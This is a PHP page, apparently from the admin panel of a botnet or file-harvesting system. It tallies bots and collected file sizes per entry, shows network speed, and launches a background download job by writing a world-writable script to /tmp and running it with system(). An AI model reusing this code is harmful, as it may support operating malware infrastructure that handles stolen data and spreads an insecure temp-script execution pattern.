<?php

if($Cur['x'] == 'download'){
	$dir = realpath('.') . '/';

	file_put_contents('/tmp/downloads.sh', '#!/bin/sh' . "\n");
	file_put_contents('/tmp/downloads.sh', 'cd ' . $dir . 'crons/' . "\n", FILE_APPEND);
	file_put_contents('/tmp/downloads.sh', '/usr/bin/env php ' . $dir . 'crons/downloads.php > /dev/null &', FILE_APPEND);
	chmod('/tmp/downloads.sh', 0777);
	@system('/tmp/downloads.sh');
	unlink('/tmp/downloads.sh');

	sleep(3);

	header('Location: /files/');
}
if(file_exists('cache/pid_downloads.txt')) $smarty->assign('pid_downloads', true);

function procent($x, $y) {
	return $y;
}

$list = array();

$sizes = array();
$sizes['s1'] = 0;
$sizes['s2'] = 0;
$sizes['s3'] = 0;
$sizes['count_bots'] = 0;

function result_data($r){	global $list, $sizes;

	if(!isset($list[$r->post_id])) $list[$r->post_id] = array('id' => $r->post_id);
	if(isset($r->post_id)) $list[$r->post_id]['id'] = $r->post_id;

	if(isset($r->s1)){		$list[$r->post_id]['s1'] = $r->s1;
		$sizes['s1'] += $r->s1;
	}

	if(isset($r->s2)){		$list[$r->post_id]['s2'] = $r->s2;
		$sizes['s2'] += $r->s2;
	}

	if(isset($r->s3)){		$list[$r->post_id]['s3'] = $r->s3;
		$sizes['s3'] += $r->s3;
	}

	if(isset($r->link)) $list[$r->post_id]['link'] = $r->link;

	if(isset($r->count_bots)){		$list[$r->post_id]['count_bots'] = $r->count_bots;
		$sizes['count_bots'] += $r->count_bots;
	}
}

$mysqli->query('SELECT id post_id, link, count_bots FROM bf_admins', null, 'result_data', false);
$mysqli->query('SELECT post_id, SUM(size) s1 FROM bf_files WHERE (status = \'0\') GROUP by post_id', null, 'result_data', false);
$mysqli->query('SELECT post_id, SUM(size) s2 FROM bf_files WHERE (status = \'1\') GROUP by post_id', null, 'result_data', false);
$mysqli->query('SELECT post_id, SUM(size) s3 FROM bf_files GROUP by post_id', null, 'result_data', false);

$sdf = scandir('cache/sdf/', false);
unset($sdf[0], $sdf[1]);
$sd = array();
$sd['all'] = 0;
foreach($sdf as $item){
	$sd[$item] = file_get_contents('cache/sdf/' . $item);
	$sd[$item] = explode('|', $sd[$item]);
	$sda = count($sd[$item])-1;
	unset($sd[$item][$sda]);
	$sd[$item] = ceil(array_sum($sd[$item]) / $sda);
	$sd['all'] = $sd['all'] + $sd[$item];
}

$sd['all'] = $sd['all'] / (count($sd) - 2);

if(file_exists('cache/current_speed.txt')){	$s = json_decode(file_get_contents('cache/current_speed.txt'), true);
	$ms = array();
	$ms['rx'] = array();
	$ms['tx'] = array();

	$cs['rx'] = count($s['rx'])-1;
	foreach($s['rx'] as $k => $c){
		if($cs['rx'] > $k){
			$ms['rx'][] = $s['rx'][$k+1] - $s['rx'][$k];
		}
	}
	$msc['rx'] = ceil(array_sum($ms['rx']) / $cs['rx']);
	$s['rx'] = size_format($msc['rx']);
	$s['rxb'] = size_format($msc['rx'], 2, true);

    $cs['tx'] = count($s['tx'])-1;
	foreach($s['tx'] as $k => $c){
		if($cs['tx'] > $k){
			$ms['tx'][] = $s['tx'][$k+1] - $s['tx'][$k];
		}
	}
	$msc['tx'] = ceil(array_sum($ms['tx']) / $cs['tx']);
	$s['tx'] = size_format($msc['tx']);
	$s['txb'] = size_format($msc['tx'], 2, true);

	$s['ft'] = date('d.m.Y H:i:s', $s['time']);
}

$smarty->assign('speed', $s);
$smarty->assign('sdf', $sd);
$smarty->assign('files', $list);
$smarty->assign('sizes', $sizes);

?>